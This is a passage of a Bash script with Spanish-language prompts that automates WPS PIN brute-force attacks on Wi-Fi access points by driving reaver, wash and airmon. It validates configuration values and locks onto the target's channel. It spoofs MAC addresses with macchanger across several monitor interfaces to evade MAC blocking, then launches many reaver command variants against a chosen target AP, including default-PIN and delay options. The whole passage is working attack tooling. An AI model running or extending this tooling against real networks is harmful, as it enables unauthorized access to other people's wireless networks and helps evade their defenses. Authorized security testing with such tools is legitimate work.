if [[ $DAMP_MDK == n || $DAMP_MDK == N || $DAMP_MDK == y || $DAMP_MDK == Y ]]; then

	: # Hacer nada

else

	echo "  ERROR DAMP_MDK=$DAMP_MDK Debe establecerse en n o N o y o Y SOLAMENTE."

		fi

if [[ $USE_AIRE1 == n || $USE_AIRE1 == N || $USE_AIRE1 == y || $USE_AIRE1 == Y ]]; then

	: # Hacer nada

else

	echo "  ERROR USE_AIRE1=$USE_AIRE1 Debe establecerse en n o N o y o Y SOLAMENTE."

		fi

if [[ $USE_AIRE0 == n || $USE_AIRE0 == N || $USE_AIRE0 == y || $USE_AIRE0 == Y ]]; then

	: # Hacer nada

else

	echo "  ERROR USE_AIRE0=$USE_AIRE0 Debe establecerse en n o N o y o Y SOLAMENTE."

		fi

#  Error Handeling USE_DHSMALL=



if [[ $USE_DHSMALL == n || $USE_DHSMALL == N || $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

	: # Hacer nada

else

	echo "  ERROR USE_DHSMALL=$USE_DHSMALL Debe establecerse en n o N o y o Y SOLAMENTE."

		fi

#  Error Handeling MACSEL=

if [[ $MACSEL == n || $MACSEL == N || $MACSEL == y || $MACSEL == Y ]]; then

	: # Hacer nada

else
	echo "  ERROR MACSEL=$MACSEL Debe establecerse en n o N o y o Y SOLAMENTE."

		fi

if [[ $MACSEL == y || $MACSEL == Y ]]; then

MACPUNCT=":::::"

sleep .2

#pruebas de puntuacion

PUNCTEST=`echo "$ASSIGN_MAC" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

#Pruebas de caracteres hexadecimales

MACALNUM=`echo "$ASSIGN_MAC" | tr -d -c ".[:alnum:]"`

sleep .2


if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

#Longitud Pruebas de cadena

if [ ${#ASSIGN_MAC} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi

sleep .2

	if [ $ALNUM == 0 ] || [ $MACLEN == 0 ] || [ $PUNCT == 0 ]; then

		echo -e "$txrst    ERROR $ASSIGN_MAC Es incorrecto!!!"

		fi


	if [ $ALNUM == 0 ]; then
		echo -e "  Está utilizando un carácter no hexadecimal.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "  Su código de Mac es la longitud incorrecta.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "  Ha introducido los separadores equivocadas y / o demasiados - Utilice sólo dos puntos :$txtrst"

			fi

	if [ $ALNUM == 0 ] || [ $MACLEN == 0 ] || [ $PUNCT == 0 ]; then

	echo ""
	echo -e "    Entrada de código de Mac $ASSIGN_MAC Es incorrecto!!!"
        echo "  debe utilizar el formato 00:11:22:33:44:55 o aa:AA:bb:BB:cc:CC"
	echo "  Sólo un a través de f, A a F, 0-9 y el símbolo: se admiten."
	echo ""
	echo -e "    Re Ingrese Mac Address en el archivo de configuración."

	echo ""

			fi

		fi

# Error Handel USE_PIXIE=

if [[ $USE_PIXIE == n || $USE_PIXIE == N || $USE_PIXIE == y || $USE_PIXIE == Y ]]; then

	: # Hacer nada

else

	echo "  USE_PIXIE=$USE_PIXIE Error Debe establecerse en n o N o y o Y SOLAMENTE."

		fi

# Error Handel USE_FIRSTPIN=

if [[ $USE_FIRSTPIN == n || $USE_FIRSTPIN == N || $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]]; then

	: # Hacer nada

else

	echo "  USE_FIRSTPIN=$USE_FIRSTPIN Error Debe establecerse en n o N o y o Y SOLAMENTE."

		fi

#Error Handel RETESTPIN=

if [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]]; then

case $RETESTPIN in

	''|*[!0-9]*) echo RETESTPIN=$RETESTPIN Error Tiene que ser un número. ;;
	#  *) echo :  ;;

		esac

	if [ $RETESTPIN -eq 0 ]; then

 echo "  RETESTPIN=$RETESTPIN DEBE ser el número mayor que cero(0)"

		fi

			fi

####Fin  Config Tratamiento de errores Fin###
echo ""
echo -e "$info   El archivo de configuración:"
echo -e "$yel        /root/VARMAC_CONFIG/$SOURCENAME"
echo -e "$info             esta cargando......"
echo -e "$info  El archivo se puede cambiar con leafpad cualquier momento. Realice los cambios y guardar."
echo -e "$info  El archivo se libera en el inicio de Stage II,III y IV.$txtrst"
echo -e "$inp    Si no hay mensajes de error se ven por encima de prensa$yel (y/Y)$inp continuar...."
echo -e "$inp  Si los mensajes de error aparecen entrar$yel (n/N)$inp y corregir los errores."
echo ""
echo -e "$txtrst    Ingrese y/Y o n/N"

read SOURCEGOODTEST

	case $SOURCEGOODTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo abortar -
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"
	rm -f configlist.txt

	done

		done

### Ajuste a los valores de 120 como demasiado corto produce errores del sueño

sleep 3

clear

### Asignar canal del archivo de salida de lavado para centrarse en reaver target ####
### comment; Esto intenta manejar salto enrutador ###    

sleep 1

CHANNEL_LOCK=$(cat < VARMAC_WASH/wash01.txt | awk -v mac=$TARGETAP1 -F' ' '{ if($1 == mac) {print $2}}')

#echo "$CHANNEL_LOCK" # wash establecer canales de target
sleep 1

if [ $CHANNEL_LOCK > 0 ]; then

         CHANNEL1=$CHANNEL_LOCK

			fi

####################################

REAVERDIR="VARMAC_LOGS"

#buscar dir vacío

if [ "$(ls -A $REAVERDIR)" ]; then

      NOTEMPT=1

	fi

if [ $NOTEMPT == 1 ]; then

echo ""    
echo -e "$warn         !!!!los VARMAC_LOG directorio no está vacío.!!!!$txtrst" 

until  [ $ERASTEST == y ] || [ $ERASTEST == Y ]; do  
echo -e "$txtrst"
echo -e "$q  Quiere borrar todos los archivos de la VARMAC_LOG Directorio?"
echo -e "$info     Dejando estos archivos en su lugar no afectará el programa."
echo "" 
echo -e "$inp  Escribe$yel(y/Y)$inp para borrar estos archivos o$yel(n/N)$inp a $txtrst"
echo -e "$inp    dejar estos archivos en su lugar.$txtrst"
read ERAS

	while true
	do

echo ""
echo -e "$inp  Entraste$yel $ERAS$info Escribe$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo$txtrst"
read ERASTEST

	case $ERASTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo abortar -
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"

	done
		done
			fi

#### Borra el archivo en el registro por la selección ####

if [ $ERAS == y ] || [ $ERAS == Y ]; then


	rm -rfv VARMAC_LOGS/* &> /dev/null

		fi

####fin Borra el archivo en el registro por la selección fin####

################## Conservar los nombres originales para la alerta de texto ##########

NMEWARN1=$NAME1  # Se inserta en los mensajes de advertencia en bash 
NMEWARN2='""$NAME1""' # Se inserta en cadena de comandos para reaver -e variables maneja espacios
##########fin conservar el nombre original para advertencias reaver fin########

########### Quite los espacios de nombres para los nombres de archivos #########

if [ $AP_HIDDEN == m ] || [ $AP_HIDDEN == M ]; then

           CHANNEL1=$CHANNEL_MAN

			fi

NAME1=${NAME1// /_}

##########fin Eliminar espacios en los nombres fin#########

sleep 2

clear
until  [ $COUNTTEST == y ] || [ $COUNTTEST == Y ]; do  

clear
echo ""
echo -e "$q  Cuántas veces usted desea que el programa del ciclo a través de la targetAP? (CUENTA)"
echo ""
echo -e "$warn     !!!!Introduzca un número menor que 100,000!!!!$txtrst"
read COUNT

while  [ $COUNT -gt 99999 ]; do
        echo -e "$warn  !!!Por favor, introduzca un número menor que 100,000!!!"
	echo -e "$q     Cuántas veces usted desea que el programa del ciclo a través de todos targetAPs?(CUENTA)$txtrst"
      	read COUNT

	done

while true

	do

echo ""
echo -e "$inp  Entraste$yel $COUNT$inp escribe$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo.$txtrst"
	read COUNTTEST

	case $COUNTTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo abortar -
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"

	done

		done

###################ADN VIEJO Depuración - Proceso trasladó a config archivo para permitir una mayor flexibilidad

MACBLOCKCHOICE_fn()

{
MACSELTEST=ZZZ

clear

until  [ $MACSELTEST == y ] || [ $MACSELTEST == Y ]; do  

echo ""
echo -e "$info    Si sospecha mac bloqueo de direcciones, puede asignar mac específico"
echo -e "  direcciones a su dispositivo y monitores. Se proporcionan opciones."
echo ""
echo -e "$inp    Si se sospecha que hay bloqueo mac-address entrar$yel (r/R)$inp. Random"
echo -e "  Las direcciones MAC se asignarán al dispositivo y monitores."
echo ""
echo -e "$inp    Si usted sospecha que existe mac bloqueo de direcciones y desea asignar"
echo -e "  una dirección específica a su dispositivo y monitores ENTRAR$yel (a/A)$inp."

echo -e "    Si desea ayuda sobre este tema leer el archivo de ayuda entrar$yel (h/H)$inp."

echo -e "$warn  !!!ADVERTENCIA si selecciona$yel (a/A)$inp leer los archivos de ayuda PRIMERA!!!"

read MACSEL

      if  [ $MACSEL == h ] || [ $MACSEL == H ]; then
				clear
				echo ""
				echo ""
				MACBLOCK_fn

				fi

	while true
	do


      if  [ $MACSEL == r ] || [ $MACSEL == R ] || [ $MACSEL == a ] || [ $MACSEL == A ]; then

echo ""
echo -e "$inp  Entraste$yel $MACSEL$info escribe$yel (y/Y)$inp para confirmar o$yel (n/N)$inp para volver a intentarlo.$txtrst"


	elif [ $MACSEL == h ] || [ $MACSEL == H ]; then

echo ""
echo -e "$inp  Entraste$yel $MACSEL$info para ayudar escribe $yel (n/N)$inp para volver a intentarlo.$txtrst"

         else

echo ""
echo -e "$warn Error escribe $yel (n/N)$inp para volver a intentarlo.$txtrst"

			fi

read MACSELTEST

	case $MACSELTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo abortar -
	exit
	;;

	esac
	echo -e  "$warn  !!!De entrada incorrecto, inténtelo de nuevo!!!$txtrst"

	done
	clear
		done


if  [ $MACSEL == a ] || [ $MACSEL == A ]; then

	echo -e "$inp    Introduzca la dirección MAC para asignar el dispositivo wifi y primer monitor.$txtrst"
        echo -e "$inp  Introduzca en este formato$yel 55:44:33:22:11:00$inp SOLAMENTE!!!"
        echo ""
        echo -e "$info Existe cierta gestión de errores de esta entrada.$txtrst"
	read ASSIGN_MAC

	ASSGNERROR_HANDEL_fn

		fi

}
###

FN=1

if [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]]; then

			EVTEN=1

			fi

let COUNTSTART=COUNT

while  [ $COUNT -gt 0 ]; do

echo -e "$txtrst" 

if [ $COUNTSTART -lt 1000 ]; then

	PAD=`printf "%03d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%03d\n" $PF`
		fi	
			fi

if [ $COUNTSTART -gt 999 ] && [ $COUNTSTART -lt 10000 ]; then

	PAD=`printf "%04d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%04d\n" $PF`
		fi
			fi

if [ $COUNTSTART -gt 9999 ] && [ $COUNTSTART -lt 100000 ]; then

	PAD=`printf "%05d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%05d\n" $PF`
		fi

			fi

echo -e "$txtrst"
DATEFILE=$(date +%y%m%d-%H:%M)

#$TARGETAP1-$DATEFILE-$PAD Nota horas y minutos añadió para evitar sobrescribir


###Empezar Función del pin por defecto Empezar###

WPS_DEFAULTPINS_fn

###fin  Función del pin por defecto fin###

### EmpezarRutinas MAC Spoofing Empezar ###
# echo -e "Línea de dirección MAC aleatoria 2475"
#########################

if  [ $MACSEL == n  ] || [ $MACSEL == N ]; then

echo -e "$info  Asignación de una dirección MAC aleatoria a$yel $DEV$info.$txtrst"
sleep 1

ifconfig $DEV down
sleep .1
iwconfig $DEV mode managed
sleep 1
macchanger -r $DEV
sleep 2
VARMAC=$(ifconfig $DEV | grep "$DEV     Link encap:Ethernet  HWaddr " | sed s/"$DEV     Link encap:Ethernet  HWaddr "//g)
sleep 2
ifconfig $DEV hw ether $VARMAC
sleep 2
ifconfig $DEV up

echo -e "$info  Asignación$yel $DEV$info dirección MAC a$yel $MON$info. $txtrst"

ifconfig $MON down
sleep 1
macchanger -m $VARMAC $MON
sleep 2
ifconfig $MON up

### hacer más monitores y hacer macs azar  ####

if [ $MON == mon0 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon1
	ifconfig $MON1 down
	sleep 1
        macchanger -r $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV
	sleep 1 
	MON2=mon2
	sleep 1
	ifconfig $MON2 down
	sleep 1
        macchanger -r $MON2
	sleep 2
        ifconfig $MON2 up

		fi

if [ $MON == mon1 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon2
	ifconfig $MON1 down
	sleep 1
        macchanger -r $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV 
	sleep 1
	MON2=mon3
	ifconfig $MON2 down
	sleep 1
        macchanger -r $MON2
	sleep 2
        ifconfig $MON2 up

		fi

if [ $MON == mon2 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon3
	ifconfig $MON1 down
	sleep 1
        macchanger -r $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV 
	sleep 1
	MON2=mon4
	ifconfig $MON2 down
	sleep 1
        macchanger -r $MON2
	sleep 2
        ifconfig $MON2 up

		fi

if [ $MON == mon3 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon4
	ifconfig $MON1 down
	sleep 1
        macchanger -r $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV 
	sleep 1
	MON2=mon5
	ifconfig $MON2 down
	sleep 1
        macchanger -r $MON2
	sleep 2
        ifconfig $MON2 up

		fi

fi

#asignar la dirección MAC de dispositivo y mon0
###############################

if  [ $MACSEL == y ] || [ $MACSEL == Y ]; then

echo -e "$info  Asignación $ASSIGN_MAC a$yel $DEV$info.$txtrst"
sleep 1

ifconfig $DEV down
sleep .1
iwconfig $DEV mode managed
sleep 1
macchanger -m $ASSIGN_MAC $DEV
sleep 2
#VARMAC=$(ifconfig $DEV | grep "$DEV     Link encap:Ethernet  HWaddr " | sed s/"$DEV     Link encap:Ethernet  HWaddr "//g)
sleep 2
ifconfig $DEV hw ether $ASSIGN_MAC
sleep 2
ifconfig $DEV up

echo -e "$info  Asignación$yel $DEV$info dirección MAC a$yel $MON$info. $txtrst"

ifconfig $MON down
sleep .1
macchanger -m $ASSIGN_MAC $MON
sleep 2
ifconfig $MON up

### hacer más monitores y hacer macs azar  ####

if [ $MON == mon0 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon1
	ifconfig $MON1 down
	sleep 1
        macchanger -r $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV 
	sleep 1
	MON2=mon2
	ifconfig $MON2 down
	sleep 1
        macchanger -r $MON2
	sleep 2
        ifconfig $MON2 up

		fi

if [ $MON == mon1 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon2
	ifconfig $MON1 down
	sleep 1
        macchanger -r $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV 
	sleep 1
	MON2=mon3
	ifconfig $MON2 down
	sleep 1
        macchanger -r $MON2
	sleep 2
        ifconfig $MON2 up

		fi

if [ $MON == mon2 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon3
	ifconfig $MON1 down
	sleep 1
        macchanger -r $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV 
	sleep 1
	MON2=mon4
	ifconfig $MON2 down
	sleep 1
        macchanger -r $MON2
	sleep 2
        ifconfig $MON2 up

		fi

if [ $MON == mon3 ]; then

	airmon-old_fn start $DEV 
	sleep 1
	MON1=mon4
	ifconfig $MON1 down
	sleep 1
        macchanger -r $MON1
	sleep 2
        ifconfig $MON1 up

	airmon-old_fn start $DEV 
	sleep 1
	MON2=mon5
	ifconfig $MON2 down
	sleep 1
        macchanger -r $MON2
	sleep 2
        ifconfig $MON2 up

		fi


sleep 2

VARMAC=$ASSIGN_MAC

fi

###fin asignar la dirección MAC de dispositivo y mon0 fin###

###fin hacer más monitores y hacer macs azar fin####

# Asignar variables para controlar la dirección MAC 

MONMAC_fn

sleep 5
##### Handel -1 issue #####

#find /etc/NetworkManager/system-connections -type f -exec sh -c "sed -i \"/^cloned-mac-address.*/d;/^\[802-11-wireless\]/a\cloned-mac-address=$MONMAC0\" \"{}\"" \;

ifconfig $DEV down
sleep .1
iwconfig $DEV mode monitor
sleep .1
ifconfig $DEV up

#####fin Handel -1 issue fin#####
###fin Rutinas MAC Spoofing fin###

sleep 2 
clear

###Empezar Reaver Programa Booleanos Inicio ninguna -e essid###

echo " "
echo " Programa está empezando por favor espera......"

#~~~~~~~~~~~~~Empezar Reaver Booleanos Empezar~~~~~~~~~~~~~~~~~#

R_BOOLEANS_fn()

{

MACSTRIP=$(echo $TARGETAP1 | tr -d -c [:xdigit:])
###Empezar Todo sin --dh-small -S Empezar#####

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver1-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -vvv -x 60 -L --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver2-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver3-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver4-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########PIN Adds

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60  --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

#######Start Reaver channel hopping options

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver1h-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -vvv -x 60 -L --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver2h-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver3h-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver4h-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5h-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60  --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6h-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7h-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

